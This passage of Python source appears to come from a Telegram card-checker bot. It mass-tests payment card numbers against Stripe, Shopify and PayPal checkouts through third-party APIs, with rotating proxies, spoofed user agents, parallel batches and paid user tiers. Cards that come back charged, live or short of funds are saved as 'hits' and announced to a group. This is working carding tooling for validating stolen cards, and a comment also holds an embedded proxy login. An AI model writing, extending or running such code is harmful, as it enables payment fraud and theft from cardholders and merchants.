        result = {
            "status_display": "⚠️ ERROR",
            "status_category": "error",
            "message": "No response from API",
            "elapsed": 0,
            "proxy_used": "None",
            "site": "Unknown",
            "gateway": "autostripe"
        }
    
    bin_info_text, bank, country, currency_code, country_code = bin_info
    
    # Get values with safe defaults
    status_display = result.get("status_display", "⚠️ UNKNOWN")
    status_category = result.get("status_category", "unknown")
    message = result.get("message", "Unknown")
    elapsed = result.get("elapsed", 0)
    proxy_used = result.get("proxy_used", "None")
    site = result.get("site", "Unknown")
    gateway_display = result.get("gateway", "autostripe")
    
    proxy_display = mask_proxy(proxy_used) if proxy_used and proxy_used != "None" else "None"
    
    ui = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status_display}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ Auto Stripe\n"
        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {message}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
    )
    
    return ui, status_category

    
# ============ WORKER MODE FOR MASS CHECKS ============

async def worker_mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
    """Worker mode mass check - processes cards one by one with configurable workers"""
    u_id = update.effective_user.id
    message = update.effective_message
    total = len(cards)
    
    # Get user tier and worker count
    tier = user_manager.get_tier(u_id)
    
    # Worker count based on tier
    WORKER_CONFIG = {
        "free": {"workers": 3, "delay": 1.5, "name": "🆓 FREE"},
        "premium": {"workers": 5, "delay": 1.0, "name": "💎 PREMIUM"},
        "ultimate": {"workers": 10, "delay": 0.8, "name": "👑 ULTIMATE"},
        "admin": {"workers": 20, "delay": 0.5, "name": "💀 ADMIN"}
    }
    
    config = WORKER_CONFIG.get(tier, WORKER_CONFIG["free"])
    worker_count = config["workers"]
    base_delay = config["delay"]
    
    print(f"\n{'='*80}")
    print(f"👷 [WORKER MODE] Starting batch for user {u_id}")
    print(f"📊 Total cards: {total}")
    print(f"👥 Workers: {worker_count} (sequential)")
    print(f"⏱️ Delay: {base_delay}s between cards")
    print(f"🎯 Tier: {config['name']}")
    print(f"{'='*80}")
    
    # Speed controller
    target_cph = TIER_SPEEDS.get(tier, 900)
    if u_id not in user_speed_controllers:
        user_speed_controllers[u_id] = SpeedController(target_cph, tier)
    speed_controller = user_speed_controllers[u_id]
    
    # Statistics
    stats = {
        "charged": 0,
        "live": 0,
        "declined": 0,
        "errors": 0,
        "total": total,
        "processed": 0
    }
    
    start_time = time.time()
    
    # Create progress message if not provided
    if progress_msg is None:
        progress_msg = await message.reply_text(
            f"👷 <b>Worker Mode Active</b>\n\n"
            f"🎯 Tier: {config['name']}\n"
            f"👥 Workers: {worker_count}\n"
            f"📝 Cards: {total}\n"
            f"🔄 Starting...",
            parse_mode=ParseMode.HTML,
            reply_markup=create_progress_buttons(0, total, 0, 0, "", "Starting...")
        )
    
    # Process cards sequentially (one at a time)
    for i, card in enumerate(cards, 1):
        # Check if session was stopped
        if u_id not in autosopi_active_tasks:
            try:
                await message.reply_text("🛑 <b>Session stopped</b>", parse_mode=ParseMode.HTML)
            except:
                pass
            break
        
        # Update progress
        await update_progress_buttons(
            context, message.chat_id, progress_msg.message_id,
            i-1, total, stats["charged"] + stats["live"], stats["declined"],
            card, f"Worker {i}/{total}..."
        )
        
        # Apply speed control
        await speed_controller.wait_if_needed()
        
        # Get a site for this card
        site = autosopi_site_manager.get_next_site_weighted()
        if not site:
            await message.reply_text("❌ No sites available.")
            break
        
        # Check if site is dead
        site_failures = autosopi_site_manager.site_failures.get(site, 0)
        if site_failures >= 3:
            print(f"⏭️ Skipping dead site: {site}")
            stats["errors"] += 1
            continue
        
        # Get proxies if allowed
        main_api_proxy = None
        backup_api_proxy = None
        
        if user_manager.can_use_proxy(u_id):
            main_api_proxy = proxy_manager.get_next_proxy_for_api(u_id, 'TEAMOICX API')
            backup_api_proxy = proxy_manager.get_next_proxy_for_api(u_id, 'MAIN API')
        
        # Process the card
        start = time.time()
        result = await fast_check_card(card, site, main_api_proxy, backup_api_proxy, u_id, retry_count=0)
        elapsed = time.time() - start
        
        speed_controller.record_response(elapsed)
        
        # Process result
        if result and result.get("success"):
            response_text = result.get("Response", "UNKNOWN")
            gateway_from_response = result.get("Gateway", "Shopify Payments")
            price = result.get("Price", "0.00")
            response_upper = response_text.upper()
            
            # Detect status (prioritize CHARGED)
            charged_patterns = ["CHARGED", "ORDER COMPLETED", "SUCCESS", "PAID", "COMPLETED"]
            otp_patterns = ["OTP", "3D", "SECURE", "AUTHENTICATION"]
            insufficient_patterns = ["INSUFFICIENT", "FUNDS"]
            
            if any(p in response_upper for p in charged_patterns):
                category = "charged"
                stats["charged"] += 1
                print(f"🔥 CHARGED: {card[:20]}... (site: {site}, time: {elapsed:.2f}s)")
                
            elif any(p in response_upper for p in otp_patterns):
                category = "live"
                stats["live"] += 1
                print(f"🔐 3D/OTP: {card[:20]}... (site: {site})")
                
            elif any(p in response_upper for p in insufficient_patterns):
                category = "live"
                stats["live"] += 1
                print(f"💰 INSUFFICIENT: {card[:20]}...")
                
            else:
                category = "declined"
                stats["declined"] += 1
                # Don't print declined to console
            
            # Show approved cards only
            if category in ["charged", "live"]:
                bin_info = await get_bin_info(card)
                bin_text, bank, country, _, _ = bin_info
                
                try:
                    price_float = float(price)
                    price_str = f"${price_float:.2f}"
                except:
                    price_str = price
                
                if category == "charged":
                    status_display = "🔥 CHARGED 🔥"
                elif "OTP" in response_upper or "3D" in response_upper:
                    status_display = "🔐 3D REQUIRED"
                else:
                    status_display = "💰 INSUFFICIENT FUNDS"
                
                output = (
                    f"┏━━━━━━━⍟\n"
                    f"┃ {status_display}\n"
                    f"┗━━━━━━━━━━━⊛\n\n"
                    f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
                    f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway_from_response}\n"
                    f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {response_text}\n"
                    f"[⌬] 𝐏𝐫𝐢𝐜𝐞 ↣ {price_str}\n"
                    f"━━━━━━━━━━━━━━━━━━━\n"
                    f"[⌬] 𝐁𝐈𝐍 ↣ {bin_text}\n"
                    f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
                    f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
                    f"━━━━━━━━━━━━━━━━━━━"
                )
                
                await message.reply_text(output, parse_mode=ParseMode.HTML)
                
                # Save hit
                await save_hit_to_file(
                    card=card,
                    gateway=gateway_from_response,
                    response=response_text,
                    price=price_str,
                    bin_info=bin_info,
                    user_id=u_id,
                    user_tier=tier
                )
                
                user_manager.increment_hits(u_id)
        
        else:
            stats["errors"] += 1
        
        user_manager.increment_checks(u_id, 1)
        stats["processed"] = i
        
        # Add delay between cards (worker mode)
        if i < total:
            await asyncio.sleep(base_delay)
    
    # Final summary
    if u_id in autosopi_active_tasks:
        total_time = time.time() - start_time
        minutes = int(total_time // 60)
        seconds = int(total_time % 60)
        cards_per_minute = (total / (total_time / 60)) if total_time > 0 else 0
        
        summary = (
            f"🏁 <b>Worker Mode Complete</b>\n\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🔥 Charged: {stats['charged']}\n"
            f"🔐 Live (3D/Insufficient): {stats['live']}\n"
            f"❌ Declined: {stats['declined']}\n"
            f"⚠️ Errors: {stats['errors']}\n"
            f"📝 Total: {stats['total']}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"📈 Rate: {cards_per_minute:.1f} cards/min\n"
            f"⏱️ Time: {minutes}m {seconds}s\n"
            f"👥 Workers: {worker_count}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"💡 <i>Worker mode = Higher success rate, less 3D/OTP</i>"
        )
        
        await progress_msg.edit_text(summary, parse_mode=ParseMode.HTML)
    
    return stats

# ============ AUTO STRIPE SINGLE CHECK COMMAND ============
async def single_check_auto_stripe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single card check with Auto Stripe gateway - /chk with GIF on hits"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    username = update.effective_user.username or update.effective_user.first_name
    
    # Parse arguments
    if len(context.args) == 1:
        card_text = context.args[0]
        site = auto_stripe_site_manager.get_site_for_user(user_id)
        if not site:
            await message.reply_text("❌ No default sites configured.")
            return
    elif len(context.args) >= 2:
        site = context.args[0].strip().lower()
        site = site.replace('http://', '').replace('https://', '').split('/')[0]
        card_text = " ".join(context.args[1:]).strip()
    else:
        await message.reply_text("❌ Invalid usage. Use: /chk <card> or /chk <site> <card>")
        return
    
    # Extract card
    card = card_formatter.extract_single_card_from_text(card_text)
    if not card:
        await message.reply_text("❌ Invalid card format.")
        return
    
    auto_stripe_active_tasks[user_id] = True
    
    try:
        if not user_manager.can_access_gateway(user_id, 'auto_stripe'):
            await message.reply_text("❌ Your tier doesn't have access to Auto Stripe gateway.")
            return
        
        tier = user_manager.get_tier(user_id)
        if user_id not in user_speed_controllers:
            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[user_id]
        
        status_msg = await message.reply_text(f"🔄 Checking card...")
        
        await speed_controller.wait_if_needed()
        start = time.time()
        
        proxy_str = get_proxy_for_user(user_id) if user_manager.can_use_proxy(user_id) else None
        result = await check_card_auto_stripe(card, site, "autostripe", AUTO_STRIPE_API_KEY, proxy_str)
        
        elapsed = time.time() - start
        speed_controller.record_response(elapsed)
        
        if result.get("status_category") == "approved":
            auto_stripe_site_manager.record_site_result(site, True)
        else:
            auto_stripe_site_manager.record_site_result(site, False)
        
        bin_info = await get_bin_info(card)
        
        try:
            await status_msg.delete()
        except:
            pass
        
        status_category = result.get("status_category", "unknown")
        response_msg = result.get("message", "")
        
        # ============ USE GIF FOR HITS ============
        if status_category in ["approved", "charged"] or is_hit_response(response_msg)[0]:
            await send_gif_with_result_combined(
                update=update,
                context=context,
                card=card,
                gateway="auto_stripe",
                response=response_msg,
                price="N/A",
                bin_info=bin_info,
                status_category="charged",
                username=username
            )
            
            await save_hit_to_file(
                card=card, gateway="Auto Stripe",
                response=response_msg, price="N/A",
                bin_info=bin_info, user_id=user_id, user_tier=tier
            )
            
            user_data = user_manager.get_user(user_id)
            await send_hit_notification(
                context=context, gateway="Auto Stripe", card=card,
                response=response_msg, price="N/A",
                user=user_data, bin_info=bin_info, status_category="approved"
            )
            
            user_manager.increment_hits(user_id)
        else:
            # Regular response (no GIF)
            ui, _ = format_auto_stripe_response(result, card, bin_info)
            await message.reply_text(ui, parse_mode=ParseMode.HTML)
        
        user_manager.increment_checks(user_id)
        
    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)[:100]}")
        print(f"❌ [Auto Stripe Single] Error: {traceback.format_exc()}")
    finally:
        auto_stripe_active_tasks.pop(user_id, None)
        
# ============ AUTO STRIPE MASS CHECK LOGIC ============
async def auto_stripe_mass_check_logic_with_progress(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, site: str, progress_msg=None):
    """Wrapper for Auto Stripe mass check logic with PARALLEL processing (10 cards at a time)"""
    u_id = update.effective_user.id
    message = update.effective_message
    total = len(cards)
    
    # Create progress message if not provided
    if progress_msg is None:
        progress_msg = await message.reply_text(
            f"🔄 <b>Auto Stripe Mass Check Started</b>\n\n"
            f"📝 Cards: {total}\n"
            f"⚡ Parallel: 10 cards at a time\n"
            f"🚀 Processing...",
            parse_mode=ParseMode.HTML,
            reply_markup=create_progress_buttons(0, total, 0, 0, "", "Starting...")
        )
    
    # Track which cards have been sent
    sent_cards = set()
    
    try:
        auto_stripe_active_tasks[u_id] = True
        
        approved, declined, errors = 0, 0, 0
        start_time_session = time.time()
        
        tier = user_manager.get_tier(u_id)
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        # ============ PARALLEL CONFIGURATION ============
        PARALLEL_COUNT = 10  # Check 10 cards at a time
        processed = 0
        
        # Lock for updating stats safely
        stats_lock = asyncio.Lock()
        
        async def process_single_card(card: str, index: int) -> dict:
            """Process a single card - runs in parallel"""
            nonlocal processed, approved, declined, errors
            
            # Apply speed control
            await speed_controller.wait_if_needed()
            
            # Check the card
            start = time.time()
            proxy_str = get_proxy_for_user(u_id) if user_manager.can_use_proxy(u_id) else None
            result = await check_card_auto_stripe(card, site, "autostripe", AUTO_STRIPE_API_KEY, proxy_str)
            elapsed = time.time() - start
            speed_controller.record_response(elapsed)
            
            # Get BIN info
            bin_info = await get_bin_info(card)
            response_msg = result.get("message", "") if result else ""
            is_hit, hit_type = is_hit_response(response_msg)
            status_category = result.get("status_category", "unknown") if result else "error"
            
            # Update stats with lock
            async with stats_lock:
                processed += 1
                
                # Update progress every 5 cards
                if processed % 5 == 0 or processed == total:
                    await update_progress_buttons(
                        context, message.chat_id, progress_msg.message_id,
                        processed, total, approved, declined,
                        f"{processed}/{total}", f"Parallel processing..."
                    )
            
            return {
                'card': card,
                'result': result,
                'bin_info': bin_info,
                'response_msg': response_msg,
                'is_hit': is_hit,
                'status_category': status_category,
                'elapsed': elapsed,
                'index': index
            }
        
        # Process cards in parallel batches of PARALLEL_COUNT
        for batch_start in range(0, total, PARALLEL_COUNT):
            if u_id not in auto_stripe_active_tasks:
                break
            
            batch_end = min(batch_start + PARALLEL_COUNT, total)
            batch_cards = cards[batch_start:batch_end]
            batch_number = (batch_start // PARALLEL_COUNT) + 1
            total_batches = (total + PARALLEL_COUNT - 1) // PARALLEL_COUNT
            
            print(f"\n📦 Processing Batch {batch_number}/{total_batches} ({len(batch_cards)} cards in parallel)")
            
            # Update progress for batch start
            await update_progress_buttons(
                context, message.chat_id, progress_msg.message_id,
                batch_start, total, approved, declined,
                f"Batch {batch_number}/{total_batches}", f"Processing {len(batch_cards)} cards..."
            )
            
            # Create tasks for all cards in this batch (run in parallel)
            tasks = [process_single_card(card, batch_start + i) for i, card in enumerate(batch_cards)]
            
            # Wait for all cards in this batch to complete
            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Process results (in order)
            for item in batch_results:
                if u_id not in auto_stripe_active_tasks:
                    break
                
                if isinstance(item, Exception):
                    print(f"❌ Batch task error: {item}")
                    async with stats_lock:
                        errors += 1
                    continue
                
                card = item['card']
                result = item['result']
                bin_info = item['bin_info']
                response_msg = item['response_msg']
                is_hit = item['is_hit']
                status_category = item['status_category']
                index = item['index']
                
                # Check if we already sent this card
                if card in sent_cards:
                    print(f"⚠️ Skipping duplicate send for card: {card[:20]}...")
                    continue
                
                # Update stats based on result
                async with stats_lock:
                    if status_category == "approved" or is_hit:
                        approved += 1
                        sent_cards.add(card)
                    elif status_category == "declined":
                        declined += 1
                    else:
                        errors += 1
                
                # Send result ONLY for approved/hit cards
                if status_category == "approved" or is_hit:
                    # Send GIF + result combined
                    await send_gif_with_result_combined(
                        update=update,
                        context=context,
                        card=card,
                        gateway="auto_stripe",
                        response=response_msg,
                        price="N/A",
                        bin_info=bin_info,
                        status_category="approved",
                        username=update.effective_user.username or update.effective_user.first_name
                    )
                    
                    # Save hit to file
                    await save_hit_to_file(
                        card=card,
                        gateway="Auto Stripe",
                        response=response_msg,
                        price="N/A",
                        bin_info=bin_info,
                        user_id=u_id,
                        user_tier=tier
                    )
                    
                    # Send notification to group for hits
                    if is_hit or status_category == "charged":
                        user_data = user_manager.get_user(u_id)
                        await send_hit_notification(
                            context=context,
                            gateway="Auto Stripe",
                            card=card,
                            response=response_msg,
                            price="N/A",
                            user=user_data,
                            bin_info=bin_info,
                            status_category="charged" if is_hit else status_category
                        )
                    
                    user_manager.increment_hits(u_id)
                
                user_manager.increment_checks(u_id, 1)
            
            # Small delay between batches
            if batch_end < total:
                await asyncio.sleep(0.5)
        
        # Send final summary
        if u_id in auto_stripe_active_tasks:
            total_time = time.time() - start_time_session
            minutes = int(total_time // 60)
            seconds = int(total_time % 60)
            
            summary = (
                f"🏁 <b>Auto Stripe Session Finished</b>\n\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"✅ Approved/Hits: {approved}\n"
                f"❌ Declined: {declined}\n"
                f"⚠️ Errors: {errors}\n"
                f"📝 Total: {total}\n"
                f"⚡ Parallel: {PARALLEL_COUNT} cards/batch\n"
                f"⏱️ Time: {minutes}m {seconds}s"
            )
            
            try:
                await progress_msg.edit_text(summary, parse_mode=ParseMode.HTML)
            except Exception as e:
                print(f"❌ [Auto Stripe] Error editing summary: {e}")
                await message.reply_text(summary, parse_mode=ParseMode.HTML)
            
    except Exception as e:
        print(f"❌ [Auto Stripe] Error in mass check: {e}")
        print(f"📝 Traceback: {traceback.format_exc()}")
        try:
            await progress_msg.edit_text(f"❌ Error in session: {str(e)[:100]}")
        except:
            await message.reply_text(f"❌ Error in session: {str(e)[:100]}")
    finally:
        auto_stripe_active_tasks.pop(u_id, None)
        print(f"🏁 [Auto Stripe] Session ended for user {u_id}")
    

# ============ PAYPAL GATEWAY - WORKING RAILWAY API ============

PAYPAL_API_BASE = "https://web-production-c1983.up.railway.app"
PAYPAL_API_ENDPOINT = f"{PAYPAL_API_BASE}/check"



def format_proxy_for_paypal(proxy: str) -> Optional[str]:
    """
    Format proxy specifically for PayPal API
    Properly handles all proxy formats
    """
    if not proxy:
        return None
    
    try:
        original = proxy
        
        # Remove any existing http:// or https:// for parsing
        clean_proxy = proxy
        if clean_proxy.startswith(('http://', 'https://')):
            clean_proxy = clean_proxy.split('://', 1)[1]
        
        # ============ FIX: Handle malformed proxy with @ after port ============
        # Example: http://px173007.pointtoserver.com:10780@purevpn0s12153504:1LTpwxbCJbEdXo
        # This should be: purevpn0s12153504:1LTpwxbCJbEdXo@px173007.pointtoserver.com:10780
        
        # Check if there's an @ after a colon (malformed format)
        if '@' in clean_proxy:
            # Find the last @ in the string
            at_pos = clean_proxy.rfind('@')
            before_at = clean_proxy[:at_pos]
            after_at = clean_proxy[at_pos + 1:]
            
            # Check if before_at contains a colon (port)
            if ':' in before_at and after_at:
                # This is malformed: host:port@user:pass
                # Extract host:port from before_at
                parts = before_at.split(':')
                if len(parts) >= 2:
                    # The last part before @ might be the port
                    if parts[-1].isdigit():
                        # Format: host:port@user:pass
                        host = ':'.join(parts[:-1])
                        port = parts[-1]
                        # after_at should be user:pass
                        if ':' in after_at:
                            user, password = after_at.split(':', 1)
                            # Reconstruct correctly: user:pass@host:port
                            formatted = f"http://{user}:{password}@{host}:{port}"
                            print(f"✅ [PayPal Proxy] Fixed malformed proxy: {mask_proxy(formatted)}")
                            return formatted
                        else:
                            # after_at is just user? Try to parse differently
                            user = after_at
                            if ':' in before_at:
                                password = before_at.split('@')[0] if '@' in before_at else ''
                            else:
                                password = ''
                            if password:
                                formatted = f"http://{user}:{password}@{host}:{port}"
                                return formatted
        
        # Format 1: host:port:user:pass
        parts = clean_proxy.split(':')
        if len(parts) == 4:
            # Check if second part is numeric (port) -> host:port:user:pass
            if parts[1].isdigit():
                host, port, user, password = parts
                formatted = f"http://{user}:{password}@{host}:{port}"
                print(f"✅ [PayPal Proxy] Formatted host:port:user:pass -> {mask_proxy(formatted)}")
                return formatted
            # Check if fourth part is numeric (port) -> user:pass:host:port
            elif parts[3].isdigit():
                user, password, host, port = parts
                formatted = f"http://{user}:{password}@{host}:{port}"
                print(f"✅ [PayPal Proxy] Formatted user:pass:host:port -> {mask_proxy(formatted)}")
                return formatted
        
        # Format 2: user:pass@host:port
        if '@' in clean_proxy:
            # Check if we have a valid user:pass@host:port format
            auth, hostport = clean_proxy.split('@', 1)
            if ':' in auth and ':' in hostport:
                # Already correct format, just add http:// if needed
                if not clean_proxy.startswith(('http://', 'https://')):
                    formatted = f"http://{clean_proxy}"
                else:
                    formatted = clean_proxy
                print(f"✅ [PayPal Proxy] Using as-is: {mask_proxy(formatted)}")
                return formatted
        
        # Format 3: host:port only
        if len(parts) == 2 and parts[1].isdigit():
            formatted = f"http://{clean_proxy}"
            print(f"✅ [PayPal Proxy] Formatted host:port -> {mask_proxy(formatted)}")
            return formatted
        
        # Format 4: Try to detect if it's ip:port:user:pass but with non-numeric port detection
        if len(parts) >= 4:
            # Try to find which part is the port (should be numeric)
            port_index = -1
            for i, part in enumerate(parts):
                if part.isdigit() and len(part) <= 5 and 1 <= int(part) <= 65535:
                    port_index = i
                    break
            
            if port_index != -1:
                # Found a port number
                if port_index == 1:
                    # Format: host:port:user:pass
                    host = parts[0]
                    port = parts[1]
                    user = parts[2] if len(parts) > 2 else ''
                    password = parts[3] if len(parts) > 3 else ''
                    if user and password:
                        formatted = f"http://{user}:{password}@{host}:{port}"
                        return formatted
                elif port_index == 3:
                    # Format: user:pass:host:port
                    user = parts[0]
                    password = parts[1]
                    host = parts[2]
                    port = parts[3]
                    if user and password:
                        formatted = f"http://{user}:{password}@{host}:{port}"
                        return formatted
        
        # If already has http://
        if proxy.startswith(('http://', 'https://')):
            print(f"✅ [PayPal Proxy] Using as-is: {mask_proxy(proxy)}")
            return proxy
        
        print(f"⚠️ [PayPal Proxy] Could not parse: {original[:50]}...")
        return None
        
    except Exception as e:
        print(f"⚠️ [PayPal Proxy] Error formatting: {e}")
        return None

async def parse_paypal_response(response_json: dict, elapsed: float, proxy: str = None) -> Dict:
    """Parse PayPal API response with proper field handling - UPDATED: Anything not DECLINED is CHARGED"""
    
    # Default result
    default_result = {
        "status": "error",
        "result": "UNKNOWN_ERROR",
        "message": "Unknown error occurred",
        "status_display": "⚠️ ERROR",
        "status_category": "error",
        "elapsed": elapsed,
        "proxy_used": proxy,
        "retryable": False
    }
    
    if not response_json or not isinstance(response_json, dict):
        return default_result
    
    # ============ CHECK FOR HIT IN TOP-LEVEL FIELDS FIRST ============
    result_text = response_json.get('result', '')
    status_text = response_json.get('status', '')
    code_text = response_json.get('code', '')
    
    result_upper = result_text.upper()
    status_upper = status_text.upper()
    code_upper = code_text.upper()
    
    # ============ CRITICAL: Check for DECLINED responses FIRST ============
    # These are the ONLY responses that should be considered DECLINED
    declined_patterns = [
        "CARD_DECLINED", "DECLINED", "GENERIC_ERROR", "R_ERROR", 
        "EXPIRED_CARD", "LOST_CARD", "STOLEN_CARD", "RESTRICTED_CARD",
        "INCORRECT_NUMBER", "DO_NOT_HONOR", "PICKUP_CARD"
    ]
    
    for pattern in declined_patterns:
        if pattern in result_upper or (code_upper and pattern in code_upper):
            return {
                "status": "declined",
                "result": pattern,
                "message": result_text or f"Card {pattern.lower().replace('_', ' ')}",
                "status_display": "❌ DECLINED",
                "status_category": "declined",
                "elapsed": elapsed,
                "proxy_used": proxy,
                "retryable": False
            }
    
    # ============ CHECK FOR RISK_DISALLOWED ============
    if "RISK_DISALLOWED" in code_upper or "RISK_DISALLOWED" in result_upper:
        print(f"🎯 [PAYPAL] DETECTED RISK_DISALLOWED - Card is LIVE/VALID! Treating as CHARGED")
        return {
            "status": "success",
            "result": "RISK",
            "message": "RISK_DISALLOWED - Card charged successfully",
            "status_display": "RISK_DISALLOWED",
            "status_category": "LIVE",
            "elapsed": elapsed,
            "proxy_used": proxy,
            "retryable": False,
            "code": "RISK_DISALLOWED"
        }
    
    # ============ CHECK FOR EXISTING_ACCOUNT_RESTRICTED ============
    if "EXISTING_ACCOUNT_RESTRICTED" in code_upper or "EXISTING_ACCOUNT_RESTRICTED" in result_upper:
        print(f"🎯 [PAYPAL] DETECTED EXISTING_ACCOUNT_RESTRICTED - Card is LIVE/VALID! Treating as CHARGED")
        return {
            "status": "success",
            "result": "LIVE",
            "message": "EXISTING_ACCOUNT_RESTRICTED - Card charged successfully",
            "status_display": "EXISTING_ACCOUNT_RESTRICTED",
            "status_category": "LIVE",
            "elapsed": elapsed,
            "proxy_used": proxy,
            "retryable": False,
            "code": "EXISTING_ACCOUNT_RESTRICTED"
        }
    
    # ============ CHECK FOR INSUFFICIENT_FUNDS ============
    if "INSUFFICIENT_FUNDS" in code_upper or "INSUFFICIENT_FUNDS" in result_upper or "INSUFFICIENT" in result_upper:
        return {
            "status": "success",
            "result": "INSUFFICIENT_FUNDS",
            "message": "INSUFFICIENT FUNDS - Card has balance issue but is live",
            "status_display": "💰 INSUFFICIENT FUNDS",
            "status_category": "approved",  # Still a live card
            "elapsed": elapsed,
            "proxy_used": proxy,
            "retryable": False
        }
    
    # ============ CHECK FOR CVV LIVE ============
    if "INCORRECT_CVV" in code_upper or "CVV" in result_upper:
        return {
            "status": "success",
            "result": "CVV_LIVE",
            "message": "CVV verification passed - card is live",
            "status_display": "✅ CVV LIVE",
            "status_category": "approved",
            "elapsed": elapsed,
            "proxy_used": proxy,
            "retryable": False
        }
    
    # ============ ANYTHING ELSE IS CHARGED (NOT DECLINED) ============
    # If we got here and it's not DECLINED, it's a CHARGED card
    print(f"🎯 [PAYPAL] Response not declined - treating as CHARGED: {result_text[:100]}")
    return {
        "status": "success",
        "result": "CHARGED",
        "message": result_text or "Card charged successfully",
        "status_display": "🔥 CHARGED 🔥",
        "status_category": "charged",
        "elapsed": elapsed,
        "proxy_used": proxy,
        "retryable": False
    }
    
    return default_result

async def make_paypal_request(card: str, amount: str = "1.00", currency: str = "USD", proxy: str = None, retry_count: int = 0, user_id: int = None) -> Dict:
    """Make PayPal request using Railway API endpoint with retry logic and proxy support"""
    
    # Default result
    default_result = {
        "status": "error",
        "result": "REQUEST_FAILED",
        "message": "Request failed to complete",
        "status_display": "⚠️ REQUEST FAILED",
        "status_category": "error",
        "elapsed": 0,
        "proxy_used": proxy,
        "retryable": True
    }
    
    print("\n" + "="*80)
    print(f"💳 [PAYPAL DEBUG] Processing card: {card[:20]}...")
    print(f"💰 [PAYPAL DEBUG] Amount: ${amount} USD")
    if retry_count > 0:
        print(f"🔄 [PAYPAL DEBUG] RETRY ATTEMPT #{retry_count}")
    
    # Get rotating proxy if not provided and user_id is available
    if not proxy and user_id:
        proxy = get_rotating_proxy_for_user(user_id, 'paypal')
    
    if proxy:
        print(f"🔌 [PAYPAL DEBUG] Using proxy: {mask_proxy(proxy)}")
    else:
        print(f"🔌 [PAYPAL DEBUG] No proxy - direct connection")
    print("="*80)
    
    # Format the proxy properly
    formatted_proxy = None
    if proxy:
        formatted_proxy = format_proxy_for_paypal(proxy)
        if formatted_proxy:
            print(f"✅ [PAYPAL DEBUG] Formatted proxy: {mask_proxy(formatted_proxy)}")
        else:
            print(f"⚠️ [PAYPAL DEBUG] Could not format proxy, falling back to direct connection")
            proxy = None
    
    try:
        headers = {
            "User-Agent": generate_user_agent(),
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "close",
        }
        
        payload = {
            "card": card,
            "amount": amount
        }
        
        print(f"📤 [PAYPAL DEBUG] POST Request to: {PAYPAL_API_ENDPOINT}")
        print(f"📤 [PAYPAL DEBUG] Payload: {payload}")
        
        # ============ FIXED: Progressive timeouts with retry ============
        if retry_count == 0:
            timeout_value = PAYPAL_TIMEOUT  # 90 seconds
        else:
            timeout_value = PAYPAL_TIMEOUT + 10  # 100 seconds on retry
        
        print(f"⏱️ [PAYPAL DEBUG] Timeout: {timeout_value}s")
        
        start_time = time.time()
        
        # Configure client with SHORT timeouts
        client_kwargs = {
            'timeout': httpx.Timeout(
                timeout_value, 
                connect=PAYPAL_CONNECT_TIMEOUT,  # 10 seconds
                read=timeout_value - 5
            ),
            'verify': False,
            'follow_redirects': True,
            'limits': httpx.Limits(max_keepalive_connections=0, max_connections=1)
        }
        
        # Add proxy if provided
        if formatted_proxy:
            try:
                if '@' in formatted_proxy:
                    hostport = formatted_proxy.split('@')[1]
                    if ':' in hostport:
                        host, port = hostport.split(':', 1)
                        if port.isdigit():
                            client_kwargs['proxy'] = formatted_proxy
                            print(f"🔌 [PAYPAL DEBUG] Using proxy: {mask_proxy(formatted_proxy)}")
                        else:
                            print(f"⚠️ [PAYPAL DEBUG] Invalid port, using direct connection")
                            formatted_proxy = None
                    else:
                        print(f"⚠️ [PAYPAL DEBUG] Invalid proxy format, using direct connection")
                        formatted_proxy = None
                else:
                    parts = formatted_proxy.replace('http://', '').split(':')
                    if len(parts) >= 2 and parts[1].isdigit():
                        client_kwargs['proxy'] = formatted_proxy
                        print(f"🔌 [PAYPAL DEBUG] Using proxy: {mask_proxy(formatted_proxy)}")
                    else:
                        print(f"⚠️ [PAYPAL DEBUG] Invalid proxy format, using direct connection")
                        formatted_proxy = None
            except Exception as e:
                print(f"⚠️ [PAYPAL DEBUG] Error configuring proxy: {e}")
                formatted_proxy = None
        
        # Make request with SHORT timeout
        async with httpx.AsyncClient(**client_kwargs) as client:
            response = await client.post(
                PAYPAL_API_ENDPOINT,
                headers=headers,
                json=payload
            )
        
        elapsed = time.time() - start_time
        
        print(f"📥 [PAYPAL DEBUG] Response time: {elapsed:.2f}s")
        print(f"📊 [PAYPAL DEBUG] Status code: {response.status_code}")
        
        if response.status_code == 200:
            try:
                response_json = response.json()
                print(f"✅ [PAYPAL DEBUG] Parsed JSON")
                print(f"📄 [PAYPAL DEBUG] Response content: {json.dumps(response_json, indent=2)}")
                
